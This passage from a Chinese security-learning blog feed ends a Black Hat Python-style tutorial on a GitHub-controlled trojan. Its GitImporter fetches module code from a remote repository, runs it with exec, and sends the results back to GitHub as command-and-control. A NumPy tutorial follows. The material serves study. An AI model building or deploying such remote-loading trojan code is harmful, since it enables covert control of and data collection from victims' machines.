punctuation\">(</span>new_library<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">return</span> self</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">load_module</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        spec <span class=\"token operator\">=</span> importlib<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>spec_from_loader<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> loader<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> origin<span class=\"token operator\">=</span>self<span class=\"token punctuation\">.</span>repo<span class=\"token punctuation\">.</span>git_url<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        new_module <span class=\"token operator\">=</span> importlib<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>module_from_spec<span class=\"token punctuation\">(</span>spec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">exec</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>current_module_code<span class=\"token punctuation\">,</span> new_module<span class=\"token punctuation\">.</span>__dict__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">[</span>spec<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> new_module</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">return</span> new_module</pre></td></tr></table></figure><p>每当解释器尝试加载一个不存在的模块时，都会调用 GitImporter 类。<br />\n首先，解释器会调用  <code>find_module</code>  函数尝试找到这个模块，我们将这个调用交给远程加载器来处理。如果在仓库中找到这个文件，就将其中的代码以 base64 解码， 存储到我们的类里（GitHub 给我们的数据默认是 Base64 编码的）。<br />\n接着返回  <code>self</code>  ，告知解释器找到了这个模块，而且解释器可以调用  <code>self</code>  的  <code>load_module</code>  函数来实际加载模块。在这个函数里，我们调用 Python 原生的 importlib 库创建了一个空白的模块对象，并将我们从 GitHub 上拉取到的代码填进去。</p>\n</div></details>\n<h3 id=\"第六步\"><a class=\"anchor\" href=\"#第六步\">#</a> 第六步</h3>\n<details class=\"info\"><summary>执行代码</summary><div>\n<p>最后我们将新创建的模块插入 sys.modules 列表，这样未来的任何 import 语句都能直接找到它。</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\"># 将 GitImporter 添加到 sys.meta_path 列表中</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>meta_path<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>GitImporter<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\"># 创建木马对象</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    trojan <span class=\"token operator\">=</span> Trojan<span class=\"token punctuation\">(</span><span class=\"token string\">'abc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\"># 调用 run 函数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    trojan<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>执行结果：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>可以看到它连接上了仓库，读取了配置文件，拉取了配置文件中设定的两个模块，并且运行了它们。</p>\n</div></details>\n<h2 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h2>\n<p>最后在木马文件夹中执行：  <code>git pull origin master</code>  把在仓库中  <code>data</code>  目录下的数据拉取回来。</p>\n<p><strong>在 Windows 上拉取会报一些莫名其妙的错误。</strong></p>\n<p>可以在 GitHub 上看到木马提交了两个模块的执行结果。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>后面也可以对核心的 C&amp;C 机制进行若干改进。例如，自动化整个拉取数据、更新配置和发布木马的流程。</p>\n",
            "tags": [
                "BHP",
                "Python的import功能",
                "木马"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/",
            "url": "https://or0kit.github.io/Programming/Python/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/",
            "title": "pandas库学习",
            "date_published": "2021-03-23T11:08:13.000Z",
            "content_html": "<h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n",
            "tags": []
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/numpy%E5%BA%93%E5%AD%A6%E4%B9%A0/",
            "url": "https://or0kit.github.io/Programming/Python/numpy%E5%BA%93%E5%AD%A6%E4%B9%A0/",
            "title": "numpy库学习",
            "date_published": "2021-03-23T11:07:40.000Z",
            "content_html": "<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9udW1weS9udW1weS10dXRvcmlhbC5odG1s\">https://www.runoob.com/numpy/numpy-tutorial.html</span></p>\n<h1 id=\"numpy库简介\"><a class=\"anchor\" href=\"#numpy库简介\">#</a> Numpy 库简介</h1>\n<p>NumPy (Numerical Python) 是 Python 语言的一个扩展程序库，支持大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。</p>\n<p>NumPy 的前身 Numeric 最早是由 Jim Hugunin 与其它协作者共同开发，2005 年，Travis Oliphant 在 Numeric 中结合了另一个同性质的程序库 Numarray 的特色，并加入了其它扩展而开发了 NumPy。NumPy 为开放源代码并且由许多协作者共同维护开发。</p>\n<p>NumPy 是一个运行速度非常快的数学库，主要用于数组计算，包含：</p>\n<ul>\n<li>一个强大的 N 维数组对象 ndarray</li>\n<li>广播功能函数</li>\n<li>整合 C/C++/Fortran 代码的工具</li>\n<li>线性代数、傅里叶变换、随机数生成等功能</li>\n</ul>\n<h1 id=\"numpy-应用\"><a class=\"anchor\" href=\"#numpy-应用\">#</a> NumPy 应用</h1>\n<p>NumPy 通常与 SciPy（Scientific Python）和 Matplotlib（绘图库）一起使用， 这种组合广泛用于替代 MatLab，是一个强大的科学计算环境，有助于我们通过 Python 学习数据科学或者机器学习。</p>\n<p>SciPy 是一个开源的 Python 算法库和数学工具包。</p>\n<p>SciPy 包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。</p>\n<p>Matplotlib 是 Python 编程语言及其数值数学扩展包 NumPy 的可视化操作界面。它为利用通用的图形用户界面工具包，如 Tkinter, wxPython, Qt 或 GTK+ 向应用程序嵌入式绘图提供了应用程序接口（API）。</p>\n<h1 id=\"相关链接\"><a class=\"anchor\" href=\"#相关链接\">#</a> 相关链接</h1>\n<p>NumPy 官网 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5udW1weS5vcmcv\">http://www.numpy.org/</span><br />\nNumPy 源代码：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL251bXB5L251bXB5\">https://github.com/numpy/numpy</span></p>\n<h1 id=\"numpy-ndarray对象\"><a class=\"anchor\" href=\"#numpy-ndarray对象\">#</a> Numpy Ndarray 对象</h1>\n<p>NumPy 最重要的一个特点是其 N 维数组对象 ndarray，它是一系列同类型数据的集合，以 0 下标为开始进行集合中元素的索引。</p>\n<p>ndarray 对象是用于存放同类型元素的多维数组。</p>\n<p>ndarray 中的每个元素在内存中都有相同存储大小的区域。</p>\n<p>ndarray 内部由以下内容组成：</p>\n<ul>\n<li>\n<p>一个指向数据（内存或内存映射文件中的一块数据）的指针。</p>\n</li>\n<li>\n<p>数据类型或 dtype，描述在数组中的固定大小值的格子。</p>\n</li>\n<li>\n<p>一个表示数组形状（shape）的元组，表示各维度大小的元组。</p>\n</li>\n<li>\n<p>一个跨度元组（stride），其中的整数指的是为了前进到当前维度下一个元素需要 &quot;跨过&quot; 的字节数。</p>\n</li>\n</ul>\n<h1 id=\"创建ndarray\"><a class=\"anchor\" href=\"#创建ndarray\">#</a> 创建 Ndarray</h1>\n<p>创建一个 ndarray 只需调用 NumPy 的 array 函数即可：<br />\n <code>numpy.array(object, dtype = None, copy = True, order = None, subok = False, ndmin = 0)</code></p>\n<p>参数说明：</p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:right\">名称</td>\n<td style=\"text-align:left\">描述</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">object</td>\n<td style=\"text-align:left\">数组或嵌套的数列</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">dtype</td>\n<td style=\"text-align:left\">数组元素的数据类型，可选</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">copy</td>\n<td style=\"text-align:left\">对象是否需要复制，可选</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">order</td>\n<td style=\"text-align:left\">创建数组的样式，C 为行方向，F 为列方向，A 为任意方向（默认）</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">subok</td>\n<td style=\"text-align:left\">默认返回一个与基类类型一致的数组</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">ndmin</td>\n<td style=\"text-align:left\">指定生成数组的最小维度</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"认识numpy的数组对象ndarray\"><a class=\"anchor\" href=\"#认识numpy的数组对象ndarray\">#</a> 认识 Numpy 的数组对象 Ndarray</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 代码 2-1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np  <span class=\"token comment\"># 导入 NumPy 库</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>arr1 <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建一维数组</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">' 创建的数组为： '</span><span class=\"token punctuation\">,</span> arr1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 创建二维数组</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>arr2 <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的数组为：\\n'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组类型为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">.</span>dtype<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看数组类型</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组元素个数为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看数组元素个数</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组每个元素大小为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">.</span>itemsize<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看数组每个元素大小</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 代码 2-2</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>arr2<span class=\"token punctuation\">.</span>shape <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span>  <span class=\"token comment\"># 重新设置 shape</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'重新设置shape 后的arr2 为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># 代码 2-3</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用arange函数创建的数组为：\\n'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># 代码 2-4</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用linspace函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>linspace<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># 代码 2-5</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用logspace函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>logspace<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># 代码 2-6</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用zeros函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>zeros<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># 代码 2-7</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用eye函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>eye<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># 代码 2-8</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用diag函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>diag<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># 代码 2-9</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用ones函数的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>ones<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\"># 代码 2-10</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>float64<span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 整型转换为浮点型</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>int8<span class=\"token punctuation\">(</span><span class=\"token number\">42.0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 浮点型转换为整型</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 整型转换为布尔型</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 整型转换为布尔型</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 布尔型转换为浮点型</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 布尔型转换为浮点型</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># 代码 2-11</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>df <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>dtype<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>str_<span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"numitems\"</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>int64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>               <span class=\"token punctuation\">(</span><span class=\"token string\">\"price\"</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>float64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数据类型为：'</span><span class=\"token punctuation\">,</span> df<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\"># 代码 2-12</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数据类型为：'</span><span class=\"token punctuation\">,</span> df<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数据类型为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>dtype<span class=\"token punctuation\">(</span>df<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\"># 代码 2-13</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>itemz <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tomatoes\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4.14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"cabbages\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.72</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                 dtype<span class=\"token operator\">=</span>df<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'自定义数据为：'</span><span class=\"token punctuation\">,</span> itemz<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\"># 代码 2-14</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'生成的随机数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token comment\"># 代码 2-15</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'生成的随机数组为：\\n'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\"># 代码 2-16</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'生成的随机数组为：\\n'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>randn<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token comment\"># 代码 2-17</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'生成的随机数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\"># 代码 2-18</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 用整数作为下标可以获取数组中的某个元素</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token comment\"># 用范围作为下标获取数组的一个切片，包括 arr [3] 不包括 arr [5]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 省略开始下标，表示从 arr [0] 